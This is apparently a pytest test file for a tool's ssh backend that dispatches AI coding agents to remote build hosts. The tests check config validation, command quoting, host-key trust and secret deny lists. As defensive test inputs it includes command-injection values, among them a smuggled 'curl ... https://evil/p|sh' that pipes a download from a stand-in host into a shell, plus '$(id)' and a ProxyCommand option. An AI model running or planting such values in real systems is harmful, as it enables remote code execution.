"""The ssh backend (runner slice R7b) against a fake `ssh` that runs the remote command here."""

from __future__ import annotations

import os
import shlex
from pathlib import Path
from typing import Any

import pytest
from test_supervisor import REPO, Clock, FakeTmux, Reports, placement, settle, states

from maity import cli
from maity.runner import capabilities, config, supervisor, targets, workspace
from maity.runner.asuser import Ssh, Unreachable

CONFIG = """\
[hub]
url = "https://hub.example"
state_dir = "{root}/st"

[limits]
projects = ["maity"]
repositories = ["github.com/oliver-zehentleitner/*"]
max_agents = 4

[backend]
kind = "ssh"

[backend.ssh]
known_hosts = "{root}/known_hosts"
identity = "{root}/id_ed25519"

[[backend.ssh.hosts]]
name = "build-1"
address = "b1.lan"
user = "maity"
workspaces = "{root}/remote/ws"
max_agents = 1
agent_path = "{root}/remote/bin:/usr/bin:/bin"

[[backend.ssh.hosts]]
name = "build-2"
address = "b2.lan"
user = "maity"
port = 2222
workspaces = "{root}/remote/ws"
agent_path = "{root}/remote/bin:/usr/bin:/bin"

[harness.stub]
modes = ["supervised"]
"""


@pytest.fixture
def fake_ssh(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """An `ssh` that logs its arguments, fails like an unreachable host (255) while
    `<root>/down-<address>` exists, and otherwise runs the remote command line with `sh -c`
    in a fake remote home."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    home = tmp_path / "remote" / "home"
    home.mkdir(parents=True)
    (tmp_path / "remote" / "bin").mkdir()
    log = tmp_path / "ssh.log"
    script = bin_dir / "ssh"
    script.write_text(
        "#!/bin/sh\n"
        f'printf "%s\\n" "$*" >> {log}\n'
        'while [ "$1" != "--" ]; do last="$1"; shift; done\n'
        "shift\n"
        f'if [ -e "{tmp_path}/down-${{last#*@}}" ]; then\n'
        '  echo "ssh: connect to host ${last#*@} port 22: No route to host" >&2; exit 255\n'
        "fi\n"
        f'cd {home} && HOME={home} exec sh -c "$1"\n'
    )
    script.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")
    return log


def load(tmp_path: Path) -> config.Config:
    path = tmp_path / "runner.toml"
    path.write_text(CONFIG.format(root=tmp_path))
    (tmp_path / "st").mkdir(mode=0o700, exist_ok=True)
    return config.load(path)


# --- configuration and the connection ---------------------------------------------------------


def test_the_ssh_backend_reads_its_hosts(tmp_path: Path) -> None:
    cfg = load(tmp_path)
    assert cfg.ssh is not None and cfg.local is None
    assert [h.name for h in cfg.ssh.hosts] == ["build-1", "build-2"]
    assert cfg.ssh.hosts[1].port == 2222 and cfg.ssh.hosts[0].max_agents == 1


@pytest.mark.parametrize(
    ("key", "value", "problem"),
    [
        ("address", '"-oProxyCommand=x"', "not a host name or address"),
        ("user", '"root;id"', "not a user name"),
        ("workspaces", '"relative/ws"', "not an absolute path"),
        ("workspaces", '"/srv/../etc"', "not an absolute path"),
        ("isolation", '"own_user"', "own_user is not supported by this version yet"),
        ("port", "0", "1 to 65535"),
    ],
)
def test_a_host_entry_that_could_change_the_command_is_refused(
    tmp_path: Path, key: str, value: str, problem: str
) -> None:
    text = CONFIG.format(root=tmp_path)
    marker = 'name = "build-1"\n'
    lines = [line for line in text.split(marker)[1].splitlines() if line.startswith(f"{key} =")]
    head, tail = text.split(marker, 1)
    tail = tail.replace(lines[0] + "\n", "", 1) if lines else tail
    path = tmp_path / "runner.toml"
    path.write_text(head + marker + f"{key} = {value}\n" + tail)
    with pytest.raises(config.ConfigError) as caught:
        config.load(path)
    assert any(problem in p for p in caught.value.problems), caught.value.problems


def test_two_hosts_with_one_name_are_refused(tmp_path: Path) -> None:
    path = tmp_path / "runner.toml"
    path.write_text(CONFIG.format(root=tmp_path).replace('"build-2"', '"build-1"'))
    with pytest.raises(config.ConfigError) as caught:
        config.load(path)
    assert "backend.ssh.hosts: the name 'build-1' is used twice" in caught.value.problems


def test_the_connection_trusts_only_the_runners_known_hosts(tmp_path: Path) -> None:
    host = Ssh(name="build-1", address="b1.lan", login="maity", port=2222,
               known_hosts=tmp_path / "known_hosts", identity=str(tmp_path / "key"),
               control_dir=tmp_path / "ssh")  # fmt: skip
    argv = host.argv(["test", "-d", "/srv/a b"], {"PATH": "/usr/bin"})
    options = argv[: argv.index("--")]
    expected = [
        "BatchMode=yes", "StrictHostKeyChecking=yes", "GlobalKnownHostsFile=/dev/null",
        f"UserKnownHostsFile={tmp_path / 'known_hosts'}", "IdentitiesOnly=yes",
    ]  # fmt: skip
    for option in expected:
        assert option in options
    assert "-a" in options and "-x" in options  # no agent or X11 forwarding
    assert options[-1] == "maity@b1.lan" and options[options.index("-p") + 1] == "2222"
    # One remote command line, every word quoted: a space or `;` stays inside its word.
    assert shlex.split(argv[-1]) == ["env", "PATH=/usr/bin", "test", "-d", "/srv/a b"]


def test_an_agent_identity_uses_no_key_file(tmp_path: Path) -> None:
    host = Ssh(name="b", address="b.lan", login="m", known_hosts=tmp_path / "k")
    assert "-i" not in host.ssh() and "IdentitiesOnly=yes" not in host.ssh()


def test_a_target_connects_and_finds_its_harnesses(tmp_path: Path, fake_ssh: Path) -> None:
    cfg = load(tmp_path)
    tool = tmp_path / "remote" / "bin" / "tmux"
    tool.write_text("#!/bin/sh\n")
    tool.chmod(0o755)
    target = targets.ssh_hosts(cfg)[0]
    target.connect(cfg.harnesses)
    home = tmp_path / "remote" / "home"
    assert target.agent_files == home / ".maity-runner"
    assert target.backend is not None and target.backend.socket == home / ".maity-runner/tmux.sock"
    assert target.probes["stub"].available
    assert "b1.lan" in fake_ssh.read_text()


def test_an_unreachable_host_raises_unreachable(tmp_path: Path, fake_ssh: Path) -> None:
    cfg = load(tmp_path)
    (tmp_path / "down-b1.lan").touch()
    with pytest.raises(Unreachable):
        targets.ssh_hosts(cfg)[0].connect(cfg.harnesses)


# --- the supervisor across hosts ---------------------------------------------------------------


def remote_world(tmp_path: Path, fake_ssh: Path) -> Any:
    """Two connected ssh targets with fake tmux servers; the files go through the fake ssh."""
    cfg = load(tmp_path)
    found = {t.name: t for t in targets.ssh_hosts(cfg)}
    backends = {}
    for target in found.values():
        target.agent_files = tmp_path / "remote" / "home" / ".maity-runner"
        target.probes = {"stub": capabilities.Probe(None, None, None)}
        target.backend = backends[target.name] = FakeTmux(  # type: ignore[assignment]
            socket=target.agent_files / "tmux.sock"
        )
        target.reachable = True
    clock, reports, logs = Clock(), Reports(), list[str]()
    sup = supervisor.Supervisor(cfg, None, reports, logs.append, {}, now=clock, rand=lambda: 0.5,  # type: ignore[arg-type]
                                targets=found)  # fmt: skip
    return sup, backends, reports, clock, logs


def remote_clone(cfg: config.Config, host: str, n: int = 3) -> workspace.Workspace:
    assert cfg.ssh is not None
    place = workspace.locate(cfg.ssh.hosts[0].workspaces, "maity", f"agent-{n}", host)
    (place.path / ".git" / "maity").mkdir(parents=True)
    (place.path / ".git" / "config").write_text(f'[remote "origin"]\n\turl = {REPO}.git\n')
    (place.path / ".git" / "maity" / "credential").write_text("mty1.crd-x.y")
    workspace.record(cfg.state_dir, place, f"agt-{n}", f"plc-000{n}")
    return place


def test_a_placement_on_a_host_runs_there(tmp_path: Path, fake_ssh: Path) -> None:
    sup, backends, reports, _, _ = remote_world(tmp_path, fake_ssh)
    remote_clone(sup.cfg, "build-2")
    sup.update([placement(target="build-2")])
    settle(sup)
    assert [name for name, _, _ in backends["build-2"].started] == ["maity_maity_agent-3"]
    assert not backends["build-1"].started
    argv = backends["build-2"].started[0][1]
    assert argv[:3] == ["maity", "runner", "stub"]  # the host's maity, not this interpreter
    body = reports.sent[-1][1]
    assert body["target"] == "build-2" and body["state"] == "starting"
    hint = sup.targets["build-2"].attach_hint("maity_maity_agent-3")
    assert hint.startswith("ssh -t -p 2222 maity@b2.lan tmux -S ")
    assert sup.records["plc-0003"].session_hint == (hint if len(hint) <= 200 else None)
    assert sup.actual()[0]["target"] == "build-2"


def test_a_clone_record_is_keyed_by_its_host(tmp_path: Path, fake_ssh: Path) -> None:
    sup, _, _, _, _ = remote_world(tmp_path, fake_ssh)
    place = remote_clone(sup.cfg, "build-2")
    assert f"build-2:{place.path}" in workspace.records(sup.cfg.state_dir)
    other = workspace.locate(place.path.parent.parent, "maity", "agent-3", "build-1")
    with pytest.raises(workspace.Refused):  # the same path on another host is not recorded
        workspace.inspect(sup.cfg, other, REPO, "agt-3", None, sup.targets["build-1"].as_user)


def test_without_a_target_the_first_host_with_a_free_slot_is_used_and_kept(
    tmp_path: Path, fake_ssh: Path
) -> None:
    sup, backends, reports, _, _ = remote_world(tmp_path, fake_ssh)
    remote_clone(sup.cfg, "build-1", 3)
    remote_clone(sup.cfg, "build-2", 4)
    sup.update([placement(3)])
    settle(sup)
    assert backends["build-1"].started  # build-1 first, and it takes one agent
    sup.update([placement(3), placement(4)])
    settle(sup)
    assert [n for n, _, _ in backends["build-2"].started] == ["maity_maity_agent-4"]
    assert sup.records["plc-0003"].target == "build-1"
    assert sup.records["plc-0004"].target == "build-2"


def test_a_target_the_runner_does_not_have_is_refused(tmp_path: Path, fake_ssh: Path) -> None:
    sup, _, reports, _, _ = remote_world(tmp_path, fake_ssh)
    sup.update([placement(target="build-9")])
    settle(sup)
    assert states(reports)[-1] == ("failed", "harness_refused", "target_unknown")


def test_an_unreachable_host_keeps_its_agents_state_and_is_advertised(
    tmp_path: Path, fake_ssh: Path
) -> None:
    sup, backends, reports, clock, logs = remote_world(tmp_path, fake_ssh)
    patches: list[dict[str, Any]] = []

    class Client(Reports):
        def call(self, method: str, path: str, body: Any = None, **kwargs: Any) -> Any:
            if method == "PATCH":
                patches.append(body["capabilities"])
                return {}
            return super().call(method, path, body=body)

    sup.client = Client()
    sup.capabilities = capabilities.build(sup.cfg, {}, targets=list(sup.targets.values()))
    remote_clone(sup.cfg, "build-2")
    sup.update([placement(target="build-2")])
    settle(sup)
    clock.now += 30
    sup.tick()
    sent = len(sup.client.sent)

    def down() -> Any:
        raise Unreachable("ssh: connect to host b2.lan port 2222: No route to host")

    backends["build-2"].sessions = down
    clock.now += 5
    sup.tick()
    entry = next(t for t in patches[-1]["targets"] if t["name"] == "build-2")
    assert entry["reachable"] is False and entry["unreachable_since"] is not None
    assert len(sup.client.sent) == sent  # no report: the last state stands
    assert sup.records["plc-0003"].state == "running"
    assert any("target build-2: unreachable" in line for line in logs)
    clock.now += 300  # five minutes later, the agent still runs there
    sup.tick()
    del backends["build-2"].sessions
    clock.now += 5
    sup.tick()
    entry = next(t for t in patches[-1]["targets"] if t["name"] == "build-2")
    assert entry["reachable"] is True and entry["unreachable_since"] is None
    assert backends["build-2"].started[0][0] == "maity_maity_agent-3"
    assert len(backends["build-2"].started) == 1  # not started again: it never stopped


def test_capabilities_list_one_target_per_host(tmp_path: Path, fake_ssh: Path) -> None:
    sup, _, _, _, _ = remote_world(tmp_path, fake_ssh)
    sup.targets["build-1"].reachable = False
    caps = capabilities.build(sup.cfg, {}, targets=list(sup.targets.values()))
    assert caps["backend"] == "ssh"
    assert [(t["name"], t["max_agents"], t["reachable"]) for t in caps["targets"]] == [
        ("build-1", 1, False), ("build-2", 4, True),
    ]  # fmt: skip
    assert caps["targets"][0]["isolation"] == {
        "kind": "shared_user", "user": "maity", "runner_separate": True
    }  # fmt: skip
    assert caps["harnesses"][0]["targets"] == ["build-1", "build-2"]


# --- operator commands ---------------------------------------------------------------------------


def test_check_reports_an_unreachable_host_and_checks_the_other(
    tmp_path: Path, fake_ssh: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    load(tmp_path)
    (tmp_path / "known_hosts").write_text("")
    (tmp_path / "id_ed25519").write_text("")
    (tmp_path / "id_ed25519").chmod(0o600)
    (tmp_path / "remote" / "ws").mkdir(parents=True)
    for tool in ("tmux", "git", "maity"):
        script = tmp_path / "remote" / "bin" / tool
        script.write_text("#!/bin/sh\n")
        script.chmod(0o755)
    (tmp_path / "down-b1.lan").touch()
    code = cli.main(["runner", "check", "--offline", "--config", str(tmp_path / "runner.toml")])
    out = capsys.readouterr().out
    assert code == 1
    assert "build-1: cannot reach build-1" in out
    assert "ok     build-2: reached, host key known" in out
    assert "ok     build-2: tmux found on agent_path" in out
    assert f"ok     build-2: workspaces {tmp_path / 'remote' / 'ws'}" in out
    code = cli.main(["runner", "check", "--offline", "--target", "build-2",
                     "--config", str(tmp_path / "runner.toml")])  # fmt: skip
    assert "build-1" not in capsys.readouterr().out


def test_stop_all_names_a_host_it_could_not_reach(
    tmp_path: Path, fake_ssh: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    load(tmp_path)
    for tool in ("tmux",):
        script = tmp_path / "remote" / "bin" / tool
        script.write_text("#!/bin/sh\necho 'no server running' >&2\nexit 1\n")
        script.chmod(0o755)
    (tmp_path / "down-b2.lan").touch()
    code = cli.main(["runner", "stop-all", "--config", str(tmp_path / "runner.toml")])
    out = capsys.readouterr().out
    assert code == 1 and "could not reach build-2" in out


# --- against a real sshd on localhost --------------------------------------------------------


SSHD = Path("/usr/sbin/sshd")


@pytest.fixture
def real_sshd(tmp_path: Path) -> Any:
    """A throwaway sshd on 127.0.0.1 for this user, with its own host key and a key file for
    the client; stopped by its own pid. Skipped where sshd or ssh-keygen is missing."""
    import signal
    import socket
    import subprocess
    import time

    if not SSHD.exists() or shutil_which("ssh-keygen") is None:
        pytest.skip("needs sshd and ssh-keygen")
    keys = tmp_path / "sshd"
    keys.mkdir(mode=0o700)
    for name in ("host", "client"):
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(keys / name)],
                       check=True)  # fmt: skip
    (keys / "authorized_keys").write_text((keys / "client.pub").read_text())
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    conf = keys / "sshd_config"
    conf.write_text(
        f"Port {port}\nListenAddress 127.0.0.1\nHostKey {keys / 'host'}\n"
        f"PidFile {keys / 'pid'}\nAuthorizedKeysFile {keys / 'authorized_keys'}\n"
        "UsePAM no\nStrictModes no\nPasswordAuthentication no\nKbdInteractiveAuthentication no\n"
    )
    proc_ = subprocess.Popen([str(SSHD), "-D", "-e", "-f", str(conf)],  # noqa: S603
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # fmt: skip
    try:
        for _ in range(50):
            try:
                socket.create_connection(("127.0.0.1", port), timeout=0.2).close()
                break
            except OSError:
                time.sleep(0.1)
        else:
            pytest.skip("sshd did not start")
        known = tmp_path / "known_hosts"
        host_key = (keys / "host.pub").read_text().split()[:2]
        known.write_text(f"[127.0.0.1]:{port} {' '.join(host_key)}\n")
        yield port, keys / "client", known
    finally:
        proc_.send_signal(signal.SIGTERM)  # exactly this sshd
        proc_.wait(timeout=10)


def shutil_which(name: str) -> str | None:
    import shutil

    return shutil.which(name)


def real_host(tmp_path: Path, port: int, key: Path, known: Path) -> Ssh:
    import getpass
    import tempfile

    # A unix socket path is at most 107 bytes; pytest's own directories are longer.
    control = Path(tempfile.mkdtemp(prefix="ms", dir="/tmp"))
    return Ssh(name="local", address="127.0.0.1", login=getpass.getuser(), port=port,
               known_hosts=known, identity=str(key), control_dir=control)  # fmt: skip


def test_a_real_host_is_reached_and_every_word_arrives_as_it_is(
    tmp_path: Path, real_sshd: Any
) -> None:
    host = real_host(tmp_path, *real_sshd)
    assert host.home() == Path(os.path.expanduser("~"))
    words = ["a b", "$(id)", "x;y", "'q'"]
    done = host.run(["printf", "%s\n", *words])
    assert done.returncode == 0 and done.stdout.splitlines() == words
    value = "$(id); `id` 'x'"
    assert host.run(["printenv", "V"], env={"V": value}).stdout.strip() == value


def test_a_real_host_with_an_unknown_key_is_refused(tmp_path: Path, real_sshd: Any) -> None:
    port, key, known = real_sshd
    known.write_text("")  # the host's key is not in the runner's known_hosts
    with pytest.raises(Unreachable):
        real_host(tmp_path, port, key, known).home()


def test_the_control_directory_is_made_for_the_hosts(tmp_path: Path) -> None:
    cfg = load(tmp_path)
    targets.ssh_hosts(cfg)
    control = tmp_path / "st" / "ssh"
    assert control.is_dir() and (control.stat().st_mode & 0o777) == 0o700


@pytest.mark.parametrize("home", ["/x;curl -s https://evil/p|sh;#", "relative", "/a b", "/a/../b"])
def test_a_home_that_is_not_a_plain_path_refuses_the_host(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, home: str
) -> None:
    import subprocess

    host = Ssh(name="build-1", address="b1.lan", login="maity", known_hosts=tmp_path / "k")
    monkeypatch.setattr(Ssh, "run", lambda self, argv, **kw: subprocess.CompletedProcess(
        argv, 0, home + "\n", ""))  # fmt: skip
    with pytest.raises(OSError, match="not a plain absolute path"):
        host.home()


def test_the_attach_hint_quotes_every_word(tmp_path: Path, fake_ssh: Path) -> None:
    sup, _, _, _, _ = remote_world(tmp_path, fake_ssh)
    hint = sup.targets["build-2"].attach_hint("maity_maity_agent-3")
    assert shlex.split(hint)[:5] == ["ssh", "-t", "-p", "2222", "maity@b2.lan"]
    assert shlex.split(hint)[-2:] == ["-t", "maity_maity_agent-3"]


def test_the_operators_ssh_configuration_cannot_forward_or_run_local_commands(
    tmp_path: Path,
) -> None:
    options = Ssh(name="b", address="b.lan", login="m", known_hosts=tmp_path / "k").ssh()
    for option in ("ClearAllForwardings=yes", "PermitLocalCommand=no", "ServerAliveInterval=15"):
        assert option in options


def test_check_refuses_a_state_dir_too_long_for_sshs_sockets(
    tmp_path: Path, fake_ssh: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    deep = tmp_path / ("d" * 60)
    path = tmp_path / "runner.toml"
    path.write_text(CONFIG.format(root=tmp_path).replace(f"{tmp_path}/st", str(deep)))
    deep.mkdir(mode=0o700)
    cli.main(["runner", "check", "--offline", "--config", str(path)])
    assert "too long for ssh's connection sockets" in capsys.readouterr().out


@pytest.mark.parametrize(("extra", "refused"), [(0, False), (1, True)])
def test_check_counts_sshs_temporary_suffix_at_the_edge(
    tmp_path: Path, fake_ssh: Path, capsys: pytest.CaptureFixture[str], extra: int, refused: bool
) -> None:
    """The longest state_dir that still works: <state_dir>/ssh/<40 hex> plus 17 bytes is
    107, one under sun_path's 108 with its NUL; one byte more and ssh cannot bind."""
    import shutil
    import tempfile

    short = Path(tempfile.mkdtemp(prefix="m", dir="/tmp"))  # pytest's own paths are too long
    try:
        fixed = len("/ssh/") + 40 + targets.CONTROL_SUFFIX
        room = targets.UNIX_PATH_MAX - 1 - fixed - len(str(short)) - 1  # 1: the separator
        deep = short / ("d" * (room + extra))
        path = tmp_path / "runner.toml"
        path.write_text(CONFIG.format(root=tmp_path).replace(f"{tmp_path}/st", str(deep)))
        deep.mkdir(mode=0o700)
        cli.main(["runner", "check", "--offline", "--config", str(path)])
        assert ("too long for ssh's connection sockets" in capsys.readouterr().out) is refused
    finally:
        shutil.rmtree(short)


def test_a_limit_on_a_host_is_read_there_and_keeps_its_slot_there(
    tmp_path: Path, fake_ssh: Path
) -> None:
    from maity.runner import adapters, loop

    sup, backends, reports, clock, _ = remote_world(tmp_path, fake_ssh)
    remote_clone(sup.cfg, "build-1", 3)
    remote_clone(sup.cfg, "build-1", 4)
    sup.update([placement(3, target="build-1")])
    settle(sup)
    target = sup.targets["build-1"]
    assert target.agent_files is not None
    limit = target.agent_files / "agents" / "plc-0003" / adapters.LIMIT_FILE
    limit.parent.mkdir(parents=True, exist_ok=True)
    limit.write_text('{"exit_code": 75}')
    backends["build-1"].exit("maity_maity_agent-3", loop.EXIT_RATE_LIMITED)
    sup.tick()
    rec = sup.records["plc-0003"]
    assert (rec.state, rec.exit_code, rec.target) == ("rate_limited", 75, "build-1")
    assert "dd if=" in fake_ssh.read_text()  # read on the host, never through a link
    sup.update([placement(3, target="build-1"), placement(4, target="build-1")])
    settle(sup)
    assert sup.records["plc-0004"].reason == "capacity"  # build-1 takes one agent


def test_a_hosts_deny_lists_name_the_hosts_paths(tmp_path: Path, fake_ssh: Path) -> None:
    """Remote home secrets, the remote ~/.maity-runner and the other clones' credentials
    listed on the host; nothing of the runner's own machine."""
    sup, _, _, _, _ = remote_world(tmp_path, fake_ssh)
    target = sup.targets["build-2"]
    place = remote_clone(sup.cfg, "build-2", 3)
    sibling = remote_clone(sup.cfg, "build-2", 4).credential.parent
    harness = sup.cfg.harnesses["stub"]
    ctx = sup._context(placement(target="build-2"), harness, place, target)
    remote_home = tmp_path / "remote" / "home"
    assert target.agent_files is not None and target.agent_files in ctx.private
    assert remote_home / ".ssh" in ctx.private and remote_home / ".codex" in ctx.private
    assert sibling in ctx.private and place.credential.parent not in ctx.private
    assert sup.cfg.state_dir not in ctx.private and sup.cfg.state_dir.resolve() not in ctx.private
    assert "-path" in fake_ssh.read_text()  # listed on the host, over ssh


def test_codexs_sandbox_is_tried_on_the_host(tmp_path: Path, fake_ssh: Path) -> None:
    cfg = load(tmp_path)
    codex = tmp_path / "remote" / "bin" / "codex"
    codex.write_text('#!/bin/sh\n[ "$1" = sandbox ] && exit 1; echo "codex-cli 0.156.1"\n')
    codex.chmod(0o755)
    harnesses = {"codex": config.Harness("codex", ("supervised",), "supervised", binary="codex")}
    target = targets.ssh_hosts(cfg)[1]
    probes, sandbox = targets.probe_remote(target.as_user, harnesses, target.agent_path)
    assert probes["codex"].available and sandbox["codex"] is False  # its sandbox fails there
